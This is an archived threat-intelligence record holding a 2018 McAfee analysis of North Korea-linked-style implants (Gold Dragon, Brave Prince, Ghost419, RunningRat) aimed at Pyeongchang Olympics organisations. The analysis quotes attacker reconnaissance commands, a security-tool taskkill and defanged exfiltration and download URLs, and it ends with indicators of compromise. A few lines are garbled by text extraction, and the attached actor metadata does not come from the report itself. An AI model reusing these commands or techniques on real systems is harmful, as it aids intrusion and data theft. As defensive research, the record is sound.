{
    "id": "209b69e1-4d1b-456d-9a1a-803464260093",
    "created_at": "2023-02-02T02:08:04.881177Z",
    "updated_at": "2025-03-27T02:05:20.008988Z",
    "deleted_at": null,
    "sha1_hash": "53684c577f515e0da09a3124184e815bb2f20a91",
    "title": "2018-02-02 - Gold Dragon Widens Olympics Malware Attacks, Gains Permanent Presence on Victims’ Systems",
    "authors": "",
    "file_creation_date": "2023-02-01T07:44:05Z",
    "file_modification_date": "2023-02-01T07:44:05Z",
    "file_size": 231355,
    "plain_text": "# Gold Dragon Widens Olympics Malware Attacks, Gains Permanent Presence on Victims’ Systems\n\n**[mcafee.com/blogs/other-blogs/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/gold-dragon-widens-olympics-malware-attacks-gains-permanent-presence-on-victims-systems/)**\n\nFebruary 2, 2018\n\n[Ryan Sherstobitoff](https://www.mcafee.com/blogs/author/ryan-sherstobitoff/)\n\nFeb 02, 2018\n\n14 MIN READ\n\n**UPDATE (Feb. 12, 2018): A new variant of the original file-less implant appeared on Feb. 5, 2018, indicating the attack has resumed. The new**\nvariant has the same author and metadata as the original documents discovered in December, as well as a nearly identical implant. A key\ndifference, however, is the attackers leveraged hacked servers is Santiago, Chile. See indicators of compromise for this update at the bottom\nof this post.\n\n[Watch Video At:](https://youtu.be/fa25cNsOFzA) https://youtu.be/fa25cNsOFzA\n\n**ORIGINAL POST (Feb. 2, 2018): McAfee Advanced Threat Research (ATR) recently** [released a report describing a fileless attack targeting](https://securingtomorrow.mcafee.com/mcafee-labs/malicious-document-targets-pyeongchang-olympics/)\norganizations involved with the Pyeongchang Olympics. The attack used a PowerShell implant that established a channel to the attacker’s\nserver to gather basic system-level data. What was not determined at that time was what occurred after the attacker gained access to the\nvictim’s system.\nMcAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for\ntargeted access. We have named these implants, which appeared in December 2017, Gold Dragon, Brave Prince, Ghost419, and Running\nRat, based on phrases in their code.\n\nOn December 24, 2017, our analysts observed the Korean-language implant Gold Dragon. We now believe this implant is the second-stage\npayload in the Olympics attack that ATR discovered January 6, 2018. The PowerShell implant used in the Olympics campaign was a stager\nbased on the PowerShell Empire framework that created an encrypted channel to the attacker’s server. However, this implant required\nadditional modules to be executed to be a fully capable backdoor. In addition, the PowerShell implant did not contain a mechanism to persist\nbeyond a simple scheduled task. Gold Dragon has a much more robust persistence mechanism than the initial PowerShell implant and\nenables the attacker to do much more to the target system. Gold Dragon reappeared the same day that the Olympics campaign began.\n\nThe Gold Dragon malware appears to have expanded capabilities for profiling a target’s system and sending the results to a control server.\nThe PowerShell implant had only basic data-gathering capabilities—such as username, domain, machine name, and network configuration—\nwhich are useful only for identifying interesting victims and launching more complex malware against them.\n\n## Gold Dragon\n\nGold Dragon is a data-gathering implant observed in the wild since December 24. Gold Dragon gets its name from the hardcoded domain\nwww.golddragon.com, which we found throughout the samples.\n\n\n-----\n\nThis sample acts as a reconnaissance tool and downloader for subsequent payloads of the malware infection and payload chain. Apart from\ndownloading and executing binaries from the control server, Gold Dragon generates a key to encrypt data that the implant obtains from the\nsystem. This URL is not used for control; the encrypted data is sent to the server ink.inkboom.co.kr, which was used by previous implants as\nearly as May 2017.\n\nGold Dragon contains elements, code, and similar behavior to implants Ghost419 and Brave Prince, which we have tracked since May 2017. A\nDLL-based implant created on December 21 (the same day the first malicious Olympics document appeared) was downloaded by a Gold\nDragon variant created December 24. This variant was created three days before the targeted spear phishing email with the second document\nthat was sent to 333 victim organizations. The December 24 variant of Gold Dragon used the control server nid-helppchange.atwebpages.com, which was also used by a Brave Prince variant from December 21.\n\nThe first variants of Gold Dragon appeared in the wild in South Korea in July 2017. The original Gold Dragon had the file name 한글추출.exe,\nwhich translates as Hangul Extraction and was seen exclusively in South Korea. Five variants of Gold Dragon compiled December 24\nappeared heavily during the targeting of the Olympics organizations.\n\n## Analyzing Gold Dragon\n\nAs part of its initialization, Gold Dragon:\n\nBuilds its imports by dynamically loading multiple APIs from multiple libraries\nGains debug privileges (“SeDebugPrivilege”) for its own process to read remote memory residing in other processes\n\nThe malware does not establish persistence for itself but for another component (if it is found) on the system:\n\nThe malware begins by looking for an instance of the Hangul word processor (HWP) running on the system. (HWP is a Korean word\nprocessor similar to Microsoft Word.)\n\n\n-----\n\n_Checking for HWP.exe in the process list._\n\nIf HWP.exe is found running on the system, the malware finds the currently open file in HWP by extracting the file path from the\ncommand-line argument passed to HWP.exe\nThis word file (usually named *.hwp) is copied into the temporary file path\n\nC:\\DOCUME~1\\<username>\\LOCALS~1\\Temp\\2.hwp\n\nhwp is an exact copy of the file loaded into HWP.exe\nThe malware reads the contents of 2.hwp and finds an “MZ magic marker” in the file indicated by the string “JOYBERTM”\n\n\n-----\n\n_Checking for the MZ marker in the HWP file._\n\nThis marker indicates the presence of an encrypted MZ marker in the .hwp file and is decrypted by the malware and written to the Startup\nfolder for the user:\n\nC:\\Documents and Settings\\<username>\\Start Menu\\Programs\\Startup\\viso.exe\n\nThis step establishes the persistence of the malware across reboots on the endpoint\nOnce the decrypted MZ marker is written to the Startup folder, the 2.hwp is deleted from the endpoint\n\nThe malware might perform this activity for a couple of reasons:\n\nEstablish persistence for itself on the endpoint\nEstablish persistence of another component of the malware on the endpoint\nUpdate itself on endpoint after a separate updater component downloads the update from the control server\n\nThe malware has limited reconnaissance and data-gathering capabilities and is not full-fledged spyware. Any information gathered from the\nendpoint is first stored in the following file, encrypted, and sent to the control server:\n\nC:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nThe following information is gathered from the endpoint, stored in the file 1.hwp, and sent to the control server:\n\nDirectory listing of the user’s Desktop folder using command:\n\ncmd.exe /c dir C:\\DOCUME~1\\<username>\\Desktop\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nDirectory listing of the user’s recently accessed files using command:\n\ncmd.exe /c dir C:\\DOCUME~1\\<username>\\Recent >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nDirectory listing of the system’s %programfiles% folder using command:\n\ncmd.exe /c dir C:\\PROGRA~1\\ >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\n\n-----\n\nSyste o o t e e dpo t us g co a d\n\ncmd.exe /c systeminfo >> C:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nCopies the file ixe000.bin from:\n\nC:\\Documents and Settings\\<username>\\Application Data\\Microsoft\\Windows\\UserProfiles\\ixe000.bin\n\nTo:\n\nC:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\1.hwp\n\nRegistry key and value information for the current user’s Run key (with information collected):\n\nHKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n\nNumber of subkeys\n\n(<KeyIndex>) <KeyName>\n\nNumber of Values under each key including the parent Run key\n\n(<ValueIndex>) <Value_Name> <Value_Content>\n\n_Registry Run key enumeration by Gold Dragon._\n\nAn example of 1.hwp with registry and system information:\n\n\n-----\n\nGold Dragon executes these steps executed in the exfiltration process:\n\nOnce the malware has gathered the required data from the endpoint, it encrypts the data file 1.hwp using the password\n“www[dot]GoldDragon[dot]com”\nThe encrypted content is written to the data file 1.hwp.\nDuring the exfiltration process, the malware Base64-encodes the encrypted data and sends it to its control server using an HTTP POST\nrequest to the URL:\n\nhttp://ink[dot]inkboom.co.kr/host/img/jpg/post.php\n\nHTTP data/parameters used in the request include:\n\nContent-Type: multipart/form-data; boundary=—-WebKitFormBoundar ywhpFxMBe19cSjFnG <followed by base64 encoded &\nencrypted system info>\nUser Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)\nAccept-Language: en-us\nHTTP Version: HTTP/1.0\n\nThe malware can also download and execute additional components served to it by the control server. The mechanism for downloading\nadditional components is based on the Computer Name and UserName of the endpoint provided by the malware process to the control server\nin the following HTTP GET request:\n\nGET http://ink[dot]inkboom.co.kr/host/img/jpg/download.php?filename=<Computer_Name>_<username>&continue=dnsadmin\n\nAfter successfully retrieving the component from the control server, the next-stage payload is copied to the Application Data directory of the\ncurrent user and executed:\n\nC:\\DOCUME~1\\<username>\\APPLIC~1\\MICROS~1\\HNC\\hupdate.ex\n\n(note “ex,” not “exe”)\n\n\n-----\n\n_The capability to download additional components from the control server._\n\nThe malware demonstrates its evasive behavior by checking for the presence of specific processes related to antimalware products:\n\nThe presence of any process with the keywords “v3” and “cleaner.”\n\n\n-----\n\n_Checking for antimalware or cleaner processes._\n\nIf found, these processes are terminated by sending a WM_CLOSE message to their windowing threads.\n\n_Terminating an antimalware/cleaner process._\n\n\n-----\n\n## a e ce\n\nBrave Prince is a Korean-language implant that contains similar code and behavior to the Gold Dragon variants, specifically the system\nprofiling and control server communication mechanism. The malware gathers detailed logs about the victim’s configuration, contents of the\nhard drive, registry, scheduled tasks, running processes, and more. Brave Prince was first observed in the wild December 13, 2017, sending\nlogs to the attacker via South Korea’s Daum email service. Later variants posted the data to a web server via an HTTP post command, in the\nsame way that Gold Dragon does.\n\n_The embedded domain braveprince.com._\n\nThe Daum variants of Brave Prince gather information from the system and save it to the file PI_00.dat. This file is sent as an attachment to\nthe attacker’s email address. Later variants upload the file to a web server via an HTTP post command. The type of data this implant gathers\nfrom the victim’s system:\n\nDirectories and files\nNetwork configuration\nAddress resolution protocol cache\nSystemconfig to gather tasks\n\nBoth variants of Brave Prince can kill a process associated with a tool created by Daum that can block malicious code. This tool is exclusive to\nSouth Korea.\n\ntaskkill /f /im daumcleaner.exe\n\nThe later variants of Brave Prince include the following hardcoded strings:\n\nc:\\utils\\c2ae_uiproxy.exe\nc:\\users\\sales\\appdata\\local\\temp\\dwrrypm.dl\n\n## Ghost419\n\n\n-----\n\nG ost 9 s a o ea a guage p a t t at st appea ed t e d ece be 8, 0, t t e ost ece t sa p e appea g t o days\nbefore the Olympics spear phishing email. The malware can be identified by the hardcoded string and URL parameter passed to the control\nserver. Ghost419 can be traced to a sample created July 29, 2017, that appears to be a much earlier version (without the hardcoded identifier).\nThe July version shares 46% of its code with samples created in late December. This early version implant creates a unique mutex value\n(kjie23948_34238958_KJ238742) that also appears in a sample from December, with the exception that one digit has changed. Ghost419 is\nbased on Gold Dragon and Brave Prince implants and contains shared elements and code, especially for system reconnaissance functions.\n\n_Hardcoded “Ghost419” in the malware binary._\n\nThe string “WebKitFormBoundarywhpFxMBe19cSjFnG,” part of the upload mechanism, also appears in the Gold Dragon variants of late\nDecember 2017.\n\n\n-----\n\n_Gold Dragon sample._\n\n\n-----\n\n_G ost_ _9 sa_ _p e_\n\nNumerous other similarities are present in addition to system reconnaissance methods; the communication mechanism uses the same user\nagent string as Gold Dragon.\n\n_Gold Dragon user agent string._\n\n\n-----\n\n_Ghost419 user agent string._\n\n## RunningRat\n\nRunningRat is a remote access Trojan (RAT) that operates with two DLLs. It gets its name from a hardcoded string embedded in the malware.\nUpon being dropped onto a system, the first DLL executes. This DLL serves three main functions: killing antimalware, unpacking and\nexecuting the main RAT DLL, and obtaining persistence. The malware drops the Windows batch file dx.bat, which attempts to kill the task\ndaumcleaner.exe; a Korean security program. The batch file then attempts to remove itself.\n\n\n-----\n\nThe first DLL unpacks a resource file attached to the DLL using a zlib decompression algorithm. The authors of the malware left the debugging\nstrings in the binary, making the algorithm easy to identify. The second DLL is decompressed in memory and never touches the user’s file\nsystem; this file is the main RAT that executes. Finally, the first DLL adds the registry key “SysRat,” at\nSoftWare\\Microsoft\\Windows\\CurrentVersion\\Run, to ensure the malware is executed at startup.\n\n\n-----\n\nAfter the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the\nmalware will communicate with. This address is hardcoded in the second DLL as 200.200.200.13 and is modified by the first DLL to\n223.194.70.136.\n\n\n-----\n\nThis type of behavior may indicate this code is being reused or is part of a malware kit.\n\nThe first DLL uses one common antidebugging technique by checking for SeDebugPrivilege.\n\n\n-----\n\nOnce the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and\nprocessor information.\n\n\n-----\n\n-----\n\nThe malware initiates its main function of capturing user keystrokes and sending them to the control server using standard Windows\nnetworking APIs.\n\n\n-----\n\nFrom our analysis, stealing keystrokes is the main function of RunningRat; however, the DLL has code for more extensive functionality. Code\nis included to copy the clipboard, delete files, compress files, clear event logs, shut down the machine, and much more. However, our current\nanalysis shows no way for such code to be executed.\n\n\n-----\n\nMcAfee ATR analysts will continue to research RunningRat to determine if this extra code is used or is possibly left over from a larger RAT\ntoolkit.\n\nThe second DLL employs a few additional antidebugging techniques. One is the use of a custom exception handler and code paths that are\ndesigned to generate exceptions.\n\n\n-----\n\n-----\n\nThere are also a few random empty-nested threads to slow down researchers during static analysis.\n\n\n-----\n\nThe final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect\nany delay a debugger adds during runtime.\n\n## Conclusion\n\nThe PowerShell script first discovered by McAfee ATR was delivered via a spear phishing campaign that used image stenography techniques\nto hide the first-stage implant. (For more on steganography, see the _[McAfee Labs Threats Report, June 2017, page 33.)](https://www.mcafee.com/us/resources/reports/rp-quarterly-threats-jun-2017.pdf)_\n\n\n-----\n\ne p a ts co e ed t s esea c estab s a pe a e t p ese ce o t e ct s syste o ce t e o e S e p a t s e ecuted e\nimplants are delivered as a second stage once the attacker gains an initial foothold using fileless malware. Some of the implants will maintain\ntheir persistence only if Hangul Word, which is specific to South Korea, is running.\n\nWith the discovery of these implants, we now have a better understanding of the scope of this operation. Gold Dragon, Brave Prince,\nGhost419, and RunningRat demonstrate a much wider campaign than previously known. The persistent data exfiltration we see from these\nimplants could give the attacker a potential advantage during the Olympics.\n\n_We thank Charles Crawford and Asheer Malhotra for their support of this analysis._\n\n## Indicators of Compromise\n\nIPs\n\n223.194.70.136\n\nDomains\n\ntrydai.000webhostapp.com\nfollow_dai.000webhostapp.com\neodo1.000webhostapp.com\nnid-help-pchange.atwebpages.com\nink.inkboom.co.kr\nfollowgho.byethost7.com\n\nHashes\n\nfef671c13039df24e1606d5fdc65c92fbc1578d9\n06948ab527ae415f32ed4b0f0d70be4a86b364a5\n96a2fda8f26018724c86b275fe9396e24b26ec9e\nad08a60dc511d9b69e584c1310dbd6039acffa0d\nc2f01355880cd9dfeef75cff189f4a8af421e0d3\n615447f458463dc77f7ae3b0a4ad20ca2303027a\nbf21667e4b48b8857020ba455531c9c4f2560740\nbc6cb78e20cb20285149d55563f6fdcf4aaafa58\n465d48ae849bbd6505263f3323e818ccb501ba88\na9eb9a1734bb84bbc60df38d4a1e02a870962857\n539acd9145befd7e670fe826c248766f46f0d041\nd63c7d7305a8b2184fff3b0941e596f09287aa66\n35e5310b6183469f4995b7cd4f795da8459087a4\n11a38a9d23193d9582d02ab0eae767c3933066ec\ne68f43ecb03330ff0420047b61933583b4144585\n83706ddaa5ea5ee2cfff54b7c809458a39163a7a\n3a0c617d17e7f819775e48f7edefe9af84a1446b\n761b0690cd86fb472738b6dc32661ace5cf18893\n7e74f034d8aa4570bd1b7dcfcdfaa52c9a139361\n5e1326dd7122e2e2aed04ca4de180d16686853a7\n6e13875449beb00884e07a38d0dd2a73afe38283\n4f58e6a7a04be2b2ecbcdcbae6f281778fdbd9f9\n389db34c3a37fd288e92463302629aa48be06e35\n71f337dc65459027f4ab26198270368f68d7ae77\n5a7fdfa88addb88680c2f0d5f7095220b4bbffc1\n\n**Indicators of Compromise for Feb. 12 update:**\n\nHashes\n\nSha1: 7ae731d666e547b4f3442fe5675c8e8719d8d862\n\nURLs\n\nhxxps://minibodegaslock.cl:443/components/com_tags/controllers/default_tags.php\nhxxps://minibodegaslock.cl/components/com_tags/controllers/access_log\n\n[Ryan Sherstobitoff](https://www.mcafee.com/blogs/author/ryan-sherstobitoff/)\nRyan Sherstobitoff is a Senior Analyst for Major Campaigns – Advanced Threat Research in McAfee. Ryan specializes in threat intelligence in\nthe Asia Pacific Region where he conducts cutting edge...\n\n\n-----\n\n## More from McAfee Labs\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-02-02 - Gold Dragon Widens Olympics Malware Attacks, Gains Permanent Presence on Victims’ Systems.pdf"
    ],
    "report_names": [
        "2018-02-02 - Gold Dragon Widens Olympics Malware Attacks, Gains Permanent Presence on Victims’ Systems.pdf"
    ],
    "threat_actors": [
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        }
    ],
    "ts_created_at": 1675303684,
    "ts_updated_at": 1743041120,
    "ts_creation_date": 1675237445,
    "ts_modification_date": 1675237445,
    "files": {
        "pdf": "https://archive.orkl.eu/53684c577f515e0da09a3124184e815bb2f20a91.pdf",
        "text": "https://archive.orkl.eu/53684c577f515e0da09a3124184e815bb2f20a91.txt",
        "img": "https://archive.orkl.eu/53684c577f515e0da09a3124184e815bb2f20a91.jpg"
    }
}